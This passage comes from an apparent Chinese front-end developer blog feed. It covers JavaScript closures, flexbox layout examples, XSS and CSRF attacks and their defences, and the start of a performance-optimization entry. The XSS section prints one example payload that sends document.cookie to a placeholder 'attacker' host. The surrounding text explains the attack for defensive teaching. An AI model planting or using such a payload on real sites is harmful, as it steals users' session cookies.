<li>函数作为返回值<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// 自由变量去父级作用域查找，定义的父级作用域就是F1的函数作用域</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// f1得到一个函数</span></span><br><span class="line"><span class="comment">// 函数的父级作用域是定义时候的作用域，而不是执行时候的父级作用域</span></span><br><span class="line"><span class="keyword">var</span> f1 = F1();</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">200</span>;</span><br><span class="line">f1();<span class="comment">// 100</span></span><br></pre></td></tr></table></figure></li>
<li>函数作为参数传递<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F1</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f1 = F1();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F2</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">200</span>;</span><br><span class="line">  fn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">F2(f1);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>封装变量和收敛权限</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isFirstLoad</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _list = [];</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">id</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_list.indexOf(id) &gt;=<span class="number">0</span> ) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      _list.push(id);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">var</span> firstLoad = isFirstLoad();</span><br><span class="line">firstLoad(<span class="number">10</span>); <span class="comment">// true</span></span><br><span class="line">firstLoad(<span class="number">10</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>表现为_list不能随意被外部修改。</p>
<hr>
<p>2018 年 1月 5日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>初识flex布局</title>
    <url>/2019/03/01/%E5%88%9D%E8%AF%86flex%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h1 id="初识flex布局"><a href="#初识flex布局" class="headerlink" title="初识flex布局"></a>初识flex布局</h1><p>flex布局中分为container元素和item元素两大部分，这两大部分分别有自己所能控制的一些属性，列举如下：</p>
<h2 id="container"><a href="#container" class="headerlink" title="container"></a>container</h2><p>将container元素设置为display:flex即可使之内部呈现flex布局，设置为display:flex的container有如下属性：</p>
<ul>
<li>flex-direction</li>
<li>flex-wrap</li>
<li>flex-flow</li>
<li>justify-content</li>
<li>align-items</li>
<li>align-content</li>
</ul>
<a id="more"></a>

<h3 id="flex-direction"><a href="#flex-direction" class="headerlink" title="flex-direction"></a>flex-direction</h3><p>该属性指明了容器想要向哪个方向堆叠item，可以指定row，row-reverse，column，column-reverse值。默认从左向右堆叠，也就是row值。</p>
<h3 id="flex-wrap"><a href="#flex-wrap" class="headerlink" title="flex-wrap"></a>flex-wrap</h3><p>指明flex的item是否在必要的时候换行，有三个值可选，分别是wrap，nowrap和wrap-reverse，默认为nowrap，在任何情况下都不换行。wrap-reverse表明可以换行，但是原来在第一行的item变为最后一行，也就是垂直方向上和原来的次序相反。</p>
<h3 id="flex-flow"><a href="#flex-flow" class="headerlink" title="flex-flow"></a>flex-flow</h3><p>是flex-direction和flex-wrap属性的缩写，如flex-flow: row wrap;</p>
<h3 id="justify-content"><a href="#justify-content" class="headerlink" title="justify-content"></a>justify-content</h3><p>justify本身有两端对齐的意思，在这里这个属性用来在水平方向对齐item。包含五个值，分别是center，flex-start，flex-end，space-around和space-between。默认值为flex-start，从左向右的语言体系中，是左对齐。</p>
<p>其中space-around和space-between比较类似，space-around的效果是每个item左右都有一定的空间，而space-between的两端空间比较窄，而中间空间较大。</p>
<h3 id="align-items"><a href="#align-items" class="headerlink" title="align-items"></a>align-items</h3><p>用于在垂直方向上对齐高度不同的item，可以设置如下几种值：center，flex-start，flex-end，stretch和baseline。默认值为stretch，表明在垂直方向上拉伸item填满整个容器。</p>
<h3 id="align-content"><a href="#align-content" class="headerlink" title="align-content"></a>align-content</h3><p>用于对齐flex行，这也是一个垂直方向上的控制，可以设置如下值：center，flex-start，flex-end，stretch，space-around和space-between。默认为stretch，拉伸填满整个行。</p>
<p>align-items控制单行各item垂直方向对齐，align-content控制整体的items在容器垂直方向的对齐方式。</p>
<h3 id="item"><a href="#item" class="headerlink" title="item"></a>item</h3><p>item就是flex容器中一个个的子元素，可以设置如下属性：</p>
<ul>
<li>order</li>
<li>flex-grow</li>
<li>flex-shrink</li>
<li>flex-basis</li>
<li>flex</li>
<li>align-self</li>
</ul>
<h3 id="order"><a href="#order" class="headerlink" title="order"></a>order</h3><p>用于控制item显示的次序，必须为一个数字，默认为0，按html出现次序排序</p>
<h3 id="flex-grow"><a href="#flex-grow" class="headerlink" title="flex-grow"></a>flex-grow</h3><p>用于控制一个item相对于其他的item可以拉伸到多长，也是一个数值，默认为0。</p>
<h3 id="flex-shrink"><a href="#flex-shrink" class="headerlink" title="flex-shrink"></a>flex-shrink</h3><p>用于控制一个item相对于其他的item，会缩小到多短，默认为1。表明合适情况下会收缩，而将其设置为0可以使得其他item缩小的情况下它保证不被收缩。</p>
<h3 id="flex-basis"><a href="#flex-basis" class="headerlink" title="flex-basis"></a>flex-basis</h3><p>指明item的初始长度，可以设置为像素，也可以设置为百分比。百分比相对于父容器宽度，可以利用百分比做响应式布局。</p>
<h3 id="flex"><a href="#flex" class="headerlink" title="flex"></a>flex</h3><p>为flex-grow，flex-shrink和flex-basis三者的简写形式。</p>
<h3 id="align-self"><a href="#align-self" class="headerlink" title="align-self"></a>align-self</h3><p>覆盖到容器的align-items属性，指明该item在同一行的item中的对齐方式，值可以是flex-start，flex-end和center等。</p>
<h1 id="布局案例"><a href="#布局案例" class="headerlink" title="布局案例"></a>布局案例</h1><p>一个响应式布局案例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Page Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">* &#123;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Style the body */</span></span></span><br><span class="line">body &#123;</span><br><span class="line">  font-family: Arial;</span><br><span class="line">  margin: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Header/logo Title */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.header</span> &#123;</span></span><br><span class="line">  padding: 60px;</span><br><span class="line">  text-align: center;</span><br><span class="line"><span class="css">  <span class="selector-tag">background</span>: <span class="selector-id">#1abc9c</span>;</span></span><br><span class="line">  color: white;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Style the top navigation bar */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.navbar</span> &#123;</span></span><br><span class="line">  display: flex;</span><br><span class="line"><span class="css">  <span class="selector-tag">background-color</span>: <span class="selector-id">#333</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Style the navigation bar links */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.navbar</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line">  color: white;</span><br><span class="line">  padding: 14px 20px;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Change color on hover */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.navbar</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">background-color</span>: <span class="selector-id">#ddd</span>;</span></span><br><span class="line">  color: black;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Column container */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.row</span> &#123;  </span></span><br><span class="line">  display: flex;</span><br><span class="line">  flex-wrap: wrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Create two unequal columns that sits next to each other */</span></span></span><br><span class="line"><span class="css"><span class="comment">/* Sidebar/left column */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.side</span> &#123;</span></span><br><span class="line">  flex: 30%;</span><br><span class="line"><span class="css">  <span class="selector-tag">background-color</span>: <span class="selector-id">#f1f1f1</span>;</span></span><br><span class="line">  padding: 20px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Main column */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.main</span> &#123;</span></span><br><span class="line">  flex: 70%;</span><br><span class="line">  background-color: white;</span><br><span class="line">  padding: 20px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Fake image, just for this example */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.fakeimg</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">background-color</span>: <span class="selector-id">#aaa</span>;</span></span><br><span class="line">  width: 100%;</span><br><span class="line">  padding: 20px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Footer */</span></span></span><br><span class="line"><span class="css"><span class="selector-class">.footer</span> &#123;</span></span><br><span class="line">  padding: 20px;</span><br><span class="line">  text-align: center;</span><br><span class="line"><span class="css">  <span class="selector-tag">background</span>: <span class="selector-id">#ddd</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="comment">/* Responsive layout - when the screen is less than 700px wide, make the two columns stack on top of each other instead of next to each other */</span></span></span><br><span class="line"><span class="css"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width:</span> <span class="number">700px</span>) &#123;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.row</span>, <span class="selector-class">.navbar</span> &#123;   </span></span><br><span class="line">    flex-direction: column;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Note --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background:yellow;padding:5px"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h4</span> <span class="attr">style</span>=<span class="string">"text-align:center"</span>&gt;</span>Resize the browser window to see the responsive effect.<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Header --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>My Website<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>With a <span class="tag">&lt;<span class="name">b</span>&gt;</span>flexible<span class="tag">&lt;/<span class="name">b</span>&gt;</span> layout.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Navigation Bar --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- The flexible grid (content) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"side"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>About Me<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>Photo of me:<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fakeimg"</span> <span class="attr">style</span>=<span class="string">"height:200px;"</span>&gt;</span>Image<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Some text about me in culpa qui officia deserunt mollit anim..<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>More Text<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Lorem ipsum dolor sit ame.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fakeimg"</span> <span class="attr">style</span>=<span class="string">"height:60px;"</span>&gt;</span>Image<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fakeimg"</span> <span class="attr">style</span>=<span class="string">"height:60px;"</span>&gt;</span>Image<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fakeimg"</span> <span class="attr">style</span>=<span class="string">"height:60px;"</span>&gt;</span>Image<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>TITLE HEADING<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>Title description, Dec 7, 2017<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fakeimg"</span> <span class="attr">style</span>=<span class="string">"height:200px;"</span>&gt;</span>Image<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Some text..<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Sunt in culpa qui officia deserunt mollit anim id est laborum consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>TITLE HEADING<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>Title description, Sep 2, 2017<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fakeimg"</span> <span class="attr">style</span>=<span class="string">"height:200px;"</span>&gt;</span>Image<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Some text..<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Sunt in culpa qui officia deserunt mollit anim id est laborum consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Footer --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Footer<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="三栏自适应布局解决方案之flex"><a href="#三栏自适应布局解决方案之flex" class="headerlink" title="三栏自适应布局解决方案之flex"></a>三栏自适应布局解决方案之flex</h2><p>两侧定宽和中间自适应</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"layout flexbox"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">            <span class="selector-class">.layout</span><span class="selector-class">.flexbox</span> <span class="selector-class">.left-center-right</span>&#123;</span></span><br><span class="line">                display: flex;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="css">            <span class="selector-class">.layout</span><span class="selector-class">.flexbox</span> <span class="selector-class">.left</span> &#123;</span></span><br><span class="line">                width: 300px;</span><br><span class="line">                background: red;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="css">            <span class="selector-class">.layout</span><span class="selector-class">.flexbox</span> <span class="selector-class">.center</span> &#123;</span></span><br><span class="line">                background: yellow;</span><br><span class="line">                flex: 1;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="css">            <span class="selector-class">.layout</span><span class="selector-class">.flexbox</span> <span class="selector-class">.right</span> &#123;</span></span><br><span class="line">                width: 300px;</span><br><span class="line">                background: blue;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>三栏布局<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">"left-center-right"</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center"</span> <span class="attr">style</span>=<span class="string">"order: 2"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>flexbox解决方案<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                1.这是三栏布局的浮动解决方案； 2.这是三栏布局的浮动解决方案； 3.这是三栏布局的浮动解决方案； 4.这是三栏布局的浮动解决方案； 5.这是三栏布局的浮动解决方案； 6.这是三栏布局的浮动解决方案；</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span> <span class="attr">style</span>=<span class="string">"order: 1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span> <span class="attr">style</span>=<span class="string">"order: 3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>基本思路是设置container的display为flex，然后为定宽的item设置宽度，而自适应的区域设置flex属性为1，要知道flex是flex-grow，flex-shrink和flex-basis的缩写，这里我们设置的flex为1和设置flex-grow为1是一样的。因为默认的其他的item的flex-grow值为0，所以中间的item相对于其他的item会尽可能的拉伸就实现了基本效果。然后我们利用order让center的DOM结构在最上面，优先渲染。</p>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>flex</tag>
        <tag>layout</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全</title>
    <url>/2018/01/10/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="前端安全"><a href="#前端安全" class="headerlink" title="前端安全"></a>前端安全</h1><ul>
<li>CSRF:跨站请求伪造（crooss-site request forgery）</li>
<li>XSS：跨站脚本攻击（cross-site scripting）<a id="more"></a>

</li>
</ul>
<h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p>XSS即跨站脚本攻击，是一种脚本注入攻击，通过在被攻击者的浏览器中执行恶意JavaScript实现。</p>
<p>考虑一下在他人浏览器上可以执行Javscript的危害性：</p>
<ul>
<li>JS可以访问cookie</li>
<li>JS可以通过XMLHttpRequest对象发起ajax请求</li>
<li>JS可以操作DOM对页面进行窜改</li>
</ul>
<p>通过以上描述信息，我们可以：</p>
<ul>
<li>盗取cookie</li>
<li>为键盘添加监听事件，盗取密码信息</li>
<li>伪造表单到被攻击者的浏览器，诱导提交，钓鱼攻击</li>
</ul>
<h3 id="示例攻击情形"><a href="#示例攻击情形" class="headerlink" title="示例攻击情形"></a>示例攻击情形</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location=<span class="string">'http://attacker/?cookie='</span>+<span class="built_in">document</span>.cookie</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先，攻击者利用漏洞网站的表单将恶意字符串插入到网站数据库，然后被攻击者请求页面，就得到具有该恶意字符串的页面，浏览器将其作为JS解析，于是执行上述代码，将cookie信息发送到攻击者的服务器。</p>
<h3 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h3><ul>
<li>持久型XSS：恶意字符串来自网站数据库</li>
<li>反射型XSS：恶意字符串来自被攻击者的请求</li>
<li>基于DOM的XSS：漏洞位于客户端</li>
</ul>
<p>上面的示例为持久性XSS，下面介绍反射型XSS的基本流程。</p>


<p>首先攻击者制作含有恶意字符串的链接发送给被攻击者，诱导被攻击者点击该链接，然后向服务器发起请求，服务器将含有这个而已字符串的页面返回给被攻击者，被其浏览器解析后，将被攻击者cookie发送给攻击者服务器。</p>


<p>下面是基于DOM的XSS攻击，浏览器在执行合法JS之前并不会遭受攻击。该种方法没有直接将脚本插入到页面执行，而是在执行合法JS的过程中，使用了innerHTML将恶意字符串插入到了页面上。</p>
<h3 id="防止XSS"><a href="#防止XSS" class="headerlink" title="防止XSS"></a>防止XSS</h3>

<ul>
<li>可以在特定上下文对输入进行转义</li>
<li>可以对输入进行验证，设置白名单或者黑名单，但设置白名单相对容易</li>
<li>CSP(Content security policy) ，通过设置HTTP头Content‑Security‑Policy来实现，包含一些指令，指令后面用空格分隔源表达式，来指定可用于加载的源，除了URL，还有一些关键字，列举如下，<code>none</code>表示不允许任何源，<code>self</code>允许当前服务主机源，<code>unsafe-inline</code>允许inline的style，script元素，以及<code>javascript:</code>的url,<code>unsafe-eval</code>允许使用JS的eval函数。<ul>
<li>connect‑src</li>
<li>font‑src</li>
<li>frame‑src</li>
<li>img‑src</li>
<li>media‑src</li>
<li>object‑src</li>
<li>script‑src</li>
<li>style‑src</li>
</ul>
</li>
<li>HttpOnly cookie：禁止JS读取cookie</li>
</ul>
<h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><p>CSRF(Cross site request forgery)跨站请求伪造，利用用户已登录的身份，在用户毫不知情的情况下，执行非法操作。</p>
<p>在GET请求的场景下，用户通过访问危险网站B，危险网站B自动发出GET请求到用户当前访问的网站A，get的地址完成一次转账操作。<br>在POST场景下，也可以通过form onload就submit的方法自动提交表单，发出POST请求。如果是在有cookie的场景下，我们一定要禁止第三方网站访问cookie，而且不要用GET提交请求，此外请求时附带验证信息如验证码，token等。</p>
<h3 id="CSRF预防"><a href="#CSRF预防" class="headerlink" title="CSRF预防"></a>CSRF预防</h3><ul>
<li>对cookie设置SameSite属性，该属性表明Cookie不随着跨域请求发送，但是并不是浏览器都兼容了。</li>
<li>Referer检查，HTTP的Referer头告诉服务器请求从哪个链接过来的，服务器可以拿到这个信息进行判断。</li>
<li>Anti CSRF Token：发送请求时在HTTP请求中加入一个随机token，服务端拿到token之后读取cookie中的token，进行比对。</li>
<li>验证码</li>
</ul>
<p>2018 年 1月 10日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>前端性能优化</title>
    <url>/2019/02/26/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h1><h2 id="资源合并与压缩"><a href="#资源合并与压缩" class="headerlink" title="资源合并与压缩"></a>资源合并与压缩</h2><p>主要是css和js文件的资源压缩合并，压缩可以减小文件体积，而合并则可减少HTTP请求，可通过webpack和一些现有的线上工具进行。</p>
<h2 id="非核心脚本延迟-异步加载"><a href="#非核心脚本延迟-异步加载" class="headerlink" title="非核心脚本延迟/异步加载"></a>非核心脚本延迟/异步加载</h2><p>异步加载包括三种方式：async和defer以及动态脚本创建。</p>
<ul>
<li>async加载，是html5引入的机制，async加载规定脚本一旦加载好就立刻执行，并且各脚本加载的顺序不定。</li>
<li>defer加载规定脚本是否延迟加载，在HTML解析之后进行脚本加载，并且加载顺序和声明顺序一致</li>
<li>动态脚本加载是在async和defer之前，动态创造script标签进行脚本加载，并在onload事件触发后执行。</li>
</ul>
<a id="more"></a>
<h2 id="利用缓存"><a href="#利用缓存" class="headerlink" title="利用缓存"></a>利用缓存</h2><p>缓存类型包含强缓存和协商缓存，强缓存不发起HTTP请求，而协商缓存发起HTTP请求。</p>
